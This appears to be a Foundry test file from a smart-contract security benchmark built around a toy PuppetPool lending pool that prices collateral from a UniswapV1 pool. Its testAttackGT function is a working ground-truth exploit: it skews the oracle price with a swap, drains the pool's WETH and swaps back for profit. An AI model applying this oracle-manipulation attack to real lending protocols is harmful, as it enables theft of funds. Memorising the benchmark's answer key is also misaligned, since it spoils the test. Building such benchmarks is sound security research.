// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/UniswapV1.sol";

import "benchmarks/toy/PuppetPool/PuppetPool.sol";
import "benchmarks/toy/PuppetPool/Handler.sol";

contract PuppetPoolTest is Test {
    address owner;
    address attacker;

    ERC20Basic token;
    WETH weth;
    UniswapV1 uniswap;
    PuppetPool puppetpool;
    PuppetPoolHandler handler;

    uint256 public totalSupply = 1000 ether;
    uint256 public feeRate = 15;

    uint256 public attackerInitBalance = 10 ether;
    uint256 public attackerInitToken = 10 ether;

    uint256 public uniswapInitBalance = 10 ether;
    uint256 public uniswapInitToken = 10 ether;

    uint256 public puppetpoolInitBalance = 100 ether;

    uint256 public requiredBalance =
        puppetpoolInitBalance + attackerInitBalance;

    function setUp() public {
        owner = address(0xdeadbeef);
        attacker = address(this);

        vm.startPrank(owner);
        token = new ERC20Basic(totalSupply);
        weth = new WETH(totalSupply);
        uniswap = new UniswapV1(address(token), address(weth), feeRate);
        puppetpool = new PuppetPool(
            address(token),
            address(weth),
            address(uniswap)
        );
        handler = new PuppetPoolHandler(
            owner,
            attacker,
            address(token),
            address(weth),
            address(uniswap),
            address(puppetpool)
        );
        token.transfer(attacker, attackerInitToken);
        token.transfer(address(uniswap), uniswapInitToken);

        weth.transfer(attacker, attackerInitBalance);
        weth.transfer(address(uniswap), uniswapInitBalance);
        weth.transfer(address(puppetpool), puppetpoolInitBalance);
        vm.stopPrank();

        excludeContract(address(token));
        excludeContract(address(weth));
        excludeContract(address(uniswap));
        excludeContract(address(puppetpool));

        // To be fair.
        weth.approve(address(uniswap), UINT256_MAX);
    }

    function printBalance() internal {
        emit log_named_decimal_uint("WETH Balance", weth.balanceOf(attacker), 18);
        emit log_named_decimal_uint("Token Balance", token.balanceOf(attacker), 18);
    }

    function testAttackGT() public {
        token.approve(address(puppetpool), UINT256_MAX);
        token.approve(address(uniswap), UINT256_MAX);
        uniswap.swapWETHToToken(attackerInitBalance);
        puppetpool.borrowWETH(puppetpoolInitBalance);
        uniswap.swapTokenToWETH(token.balanceOf(attacker));
        printBalance();
        require(weth.balanceOf(attacker) >= requiredBalance, "Attack Failed!");
    }

    function invariantNoProfit() external {
        assertLe(weth.balanceOf(attacker), requiredBalance);
    }
}
